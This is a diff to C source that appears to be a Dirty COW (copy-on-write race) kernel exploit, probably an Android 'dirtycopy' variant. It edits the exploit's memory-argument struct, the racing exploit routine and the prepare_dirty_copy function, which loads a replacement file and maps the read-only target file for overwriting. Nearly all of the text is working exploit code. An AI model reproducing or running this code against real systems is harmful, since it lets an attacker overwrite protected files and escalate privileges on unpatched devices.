@@ -10,7 +10,7 @@ pid_t g_pid;
 struct mem_arg {
   void *offset;
   void *patch;
-  off_t patch_size;
+  size_t patch_size;
   const char *fname;
   volatile int stop;
   volatile int success;
@@ -197,7 +197,7 @@ static void exploit(struct mem_arg *mem_arg) {
     pthread_join(pth2, NULL);
   }
 
-  LOGV("result: %i %p=%lx", g_pid, (void *) mem_arg->offset, *(unsigned long *) mem_arg->offset);
+  LOGV("result: %i %p=%lx", g_pid, mem_arg->offset, *(unsigned long *) mem_arg->offset);
 }
 
 static int open_file(const char *path, int *fd, size_t *size)
@@ -222,48 +222,53 @@ static int open_file(const char *path, int *fd, size_t *size)
 
 static int prepare_dirty_copy(const char *src_path, const char *dst_path, struct mem_arg *mem_arg)
 {
-  mem_arg->fname = src_path;
+  mem_arg->fname = dst_path;
 
-  int src_fd = -1;
-  size_t src_size = 0;
+  int src_fd = -1, dst_fd = -1;
+  size_t src_size = 0, dst_size = 0, size = 0;
   if (open_file(src_path, &src_fd, &src_size) == -1)
   {
     LOGV("Error opening %s!", src_path);
     return -1;
   }
 
-  mem_arg->patch = malloc(src_size);
-  if (mem_arg->patch == NULL)
-  {
-    LOGV("Unable to allocate %d bytes: %s!", src_size, strerror(errno));
-    return -1;
-  }
-
-  memset(mem_arg->patch, 0, src_size);
-  int readed;
-  if ((readed = read(src_fd, mem_arg->patch, src_size)) != src_size)
-  {
-    LOGV("Error in read: expected %d, got %d", src_size, readed);
-    if (readed == -1)
-    {
-      LOGV("Error: %s", strerror(errno));
-    }
-
-    close(src_fd);
-    return -1;
-  }
-
-  mem_arg->patch_size = src_size;
-
-  int dst_fd = -1;
-  size_t dst_size = 0;
   if ((open_file(dst_path, &dst_fd, &dst_size) == -1))
   {
     LOGV("Could not open %s", dst_path);
     return -1;
   }
 
-  void * map = mmap(NULL, src_size, PROT_READ, MAP_PRIVATE, dst_fd, 0);
+  LOGV("fd: %d, size: %d", src_fd, src_size);
+  LOGV("fd: %d, size: %d", dst_fd, dst_size);
+
+  size = src_size;
+  if (src_size != dst_size)
+  {
+    LOGV("Source file size (%u) and destination file size (%u) differ!\n", src_size, dst_size);
+    if (src_size > dst_size) {
+      LOGV("Possible corruption detected!\n");
+    } else {
+      size = dst_size;
+    }
+  }
+
+  mem_arg->patch = malloc(size);
+  if (mem_arg->patch == NULL)
+  {
+    LOGV("Unable to allocate %d bytes: %s!", size, strerror(errno));
+    return -1;
+  }
+
+  mem_arg->patch_size = size;
+  memset(mem_arg->patch, 0, size);
+  if (read(src_fd, mem_arg->patch, size) == -1)
+  {
+    LOGV("Unable to read: %s!", strerror(errno));
+    close(src_fd);
+    return -1;
+  }
+
+  void * map = mmap(NULL, size, PROT_READ, MAP_PRIVATE, dst_fd, 0);
   if (map == MAP_FAILED) {
     LOGV("Unable to mmap file: %s!", strerror(errno));
     close(dst_fd);
